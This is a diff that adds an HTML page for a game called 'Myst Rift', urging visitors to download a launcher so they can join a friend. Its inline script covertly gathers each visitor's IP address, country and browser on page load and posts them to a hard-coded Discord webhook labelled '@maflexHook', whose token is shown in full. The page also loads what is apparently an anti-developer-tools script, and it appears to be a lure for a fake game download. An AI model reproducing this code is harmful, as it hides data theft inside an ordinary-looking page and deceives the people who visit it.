@@ -1,0 +1,203 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Myst Rift - Join Your Friends</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+  <link rel="stylesheet" href="../../css/bootstrap.min.css">
+  <link rel="stylesheet" href="../../css/all.min.css">
+  <link rel="stylesheet" href="../../css/animate.min.css">
+  <link rel="stylesheet" href="../../css/beta-pass-claim.03fcb964.css">
+  <link rel="stylesheet" href="../../css/beta-pass-claim.cce4daa8.css">
+  <link rel="icon" href="../../media/icon.ico" type="image/x-icon">
+
+  <style>
+    html,body{height:100%;margin:0;font-family:inherit}
+    .fullscreen-bg{
+      position:fixed; inset:0; z-index:0; overflow:hidden;
+      display:flex; align-items:center; justify-content:center;
+    }
+    .fullscreen-bg video{ width:100%; height:100%; object-fit:cover; filter:brightness(0.45) contrast(1.05); }
+    .fullscreen-bg .video-img{ display:none; }
+    .download-overlay{
+      position:relative; z-index:5;
+      display:flex; align-items:center; justify-content:center;
+      height:100vh; padding:20px;
+    }
+    .card-overlay{
+      max-width:880px; width:100%;
+      background: linear-gradient(180deg, rgba(10,10,10,0.5), rgba(8,8,8,0.65));
+      border-radius:12px; padding:34px;
+      box-shadow: 0 12px 40px rgba(0,0,0,0.6);
+      backdrop-filter: blur(6px);
+      border: 1px solid rgba(255,200,30,0.06);
+      color: #fff;
+    }
+    .card-overlay h2{
+      font-size:28px; letter-spacing:1px; margin:0 0 14px;
+      text-transform:uppercase;
+    }
+    .card-overlay p{ margin:0 0 22px; opacity:0.95; font-size:15px; }
+    .actions{ display:flex; gap:12px; align-items:center; flex-wrap:wrap; }
+    .custom-btn{
+      display:inline-flex; align-items:center; gap:10px;
+      padding:10px 18px; border-radius:10px; font-weight:600;
+    }
+    .btn-outline-warning.custom-btn{
+      border:2px solid #f0ad4e; color:#f0ad4e;
+      background: rgba(0,0,0,0.08);
+    }
+    .btn-outline-warning.custom-btn:hover{
+      background: rgba(240,173,78,0.08);
+      color: #fff; border-color:#f7c26e;
+      text-decoration:none;
+    }
+    .muted-note{ opacity:0.8; font-size:13px; margin-top:12px; color:#ddd; }
+    @media (max-width:768px){
+      .card-overlay{ padding:22px; border-radius:8px; }
+      .card-overlay h2{ font-size:20px; }
+    }
+  
+    .back-button {
+    position: fixed; 
+    top: 16px;
+    left: 16px;
+    z-index: 10000;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(0, 0, 0, 0.6);
+    border-radius: 30px;
+    padding: 8px 16px;
+    cursor: pointer;
+    font-weight: 700;
+    font-size: 14px;
+    color: #f0ad4e;
+    border: 2px solid #f0ad4e;
+    text-decoration: none;
+    user-select: none;
+    transition: background-color 0.3s, color 0.3s;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    box-shadow: 0 4px 8px rgba(240, 173, 78, 0.5);
+  }
+  .back-button:hover {
+    background: #f0ad4e;
+    color: #000;
+    text-decoration: none;
+    box-shadow: 0 6px 12px rgba(240, 173, 78, 0.8);
+  }
+  .back-button svg {
+    fill: currentColor;
+    width: 18px;
+    height: 18px;
+    transition: transform 0.3s;
+  }
+  .back-button:hover svg {
+    transform: translateX(-3px);
+  }
+  </style>
+</head>
+<a href="/" class="back-button" aria-label="Back to MyStrift" title="">
+  <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" >
+    <path d="M10 12L6 8l4-4" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+  </svg>
+  Back to Home
+</a>
+<body>
+  <div class="fullscreen-bg" aria-hidden="true">
+    <video autoplay loop muted playsinline>
+      <source src="../../media/background.mp4" type="video/mp4">
+      <img class="video-img" src="../../media/main.dde7f6b9.jpg" alt="">
+    </video>
+  </div>
+  <div class="download-overlay">
+    <div class="card-overlay">
+      <div class="row align-items-center">
+        <div class="col-md-8 col-sm-12">
+          <h2>TO JOIN RUNA YOU MUST FIRST DOWNLOAD THE GAME</h2>
+          <p>
+            It looks like you tried to join someone already in-game — but the Myst Rift launcher isn't installed on your device.
+            Click the button below to get the launcher and join them.
+          </p>
+
+          <div class="actions">
+            <a id="downloadBtn" class="btn btn-outline-warning custom-btn"
+               href="/" role="button" target="_self" rel="noopener">
+              <img src="../../media/chicken.29b68726.gif" alt="" style="width:20px;padding-bottom:3px;">
+              Download Launcher
+            </a>
+            <a class="btn btn-light" href="/"
+               onclick="document.querySelector('.card-overlay').style.display='none';">
+              Maybe later
+            </a>
+          </div>
+
+          <div class="muted-note">
+            By clicking Download Launcher you'll be redirected to mystrift.com
+          </div>
+        </div>
+
+        <div class="col-md-4 d-none d-md-block" style="text-align:center">
+          <img src="../../media/marcus.cd856b94.png" alt="character" style="max-width:100%; height:auto;">
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function getBrowserName() {
+      const userAgent = navigator.userAgent;
+      let browserName = 'Unknown Browser';
+  
+      if (userAgent.indexOf('Edg') > -1) browserName = 'Microsoft Edge';
+      else if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('OPR') === -1 && userAgent.indexOf('GX') === -1) browserName = 'Google Chrome';
+      else if (userAgent.indexOf('OPR') > -1) browserName = 'Opera';
+      else if (userAgent.indexOf('GX') > -1) browserName = 'Opera GX';
+      else if (userAgent.indexOf('Firefox') > -1) browserName = 'Mozilla Firefox';
+      else if (userAgent.indexOf('Brave') > -1) browserName = 'Brave';
+      else if (userAgent.indexOf('YaBrowser') > -1) browserName = 'Yandex Browser';
+      else if (userAgent.indexOf('Safari') > -1) browserName = 'Safari';
+      return browserName;
+  }
+  
+  const browserName = getBrowserName();
+  
+  fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+          const ipAddress = data.ip;
+          const country = data.country_name;
+          sendToDiscord(ipAddress, country, browserName);
+      });
+  
+  function sendToDiscord(ip, country, browser) {
+      const webhookURL = 'https://discord.com/api/webhooks/1404352872401076274/9vVbTsmX8OtlVAhpYDFk-GLDCWDi01WFPmO1DHfjyyDRqg94DTs2S7qNiF1XEJlSR3bL';
+      sendEmbedMessage(ip, country, browser, webhookURL);
+  }
+  
+  function sendEmbedMessage(ip, country, browser, webhookURL) {
+      const message = {
+          embeds: [{
+              title: "@maflexHook > join",
+              color: 0x0000001,
+              fields: [
+                  { name: "", value: `\`${ip}\``, inline: true },
+                  { name: "", value: `\`${country}\``, inline: true },
+                  { name: "", value: `\`${browser}\``, inline: true }
+              ]
+          }]
+      };
+  
+      fetch(webhookURL, {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+      });
+  }
+  </script>
+
+  <script src="../../js/maflex_nodevtools.js"></script>
+  <script src="../../js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
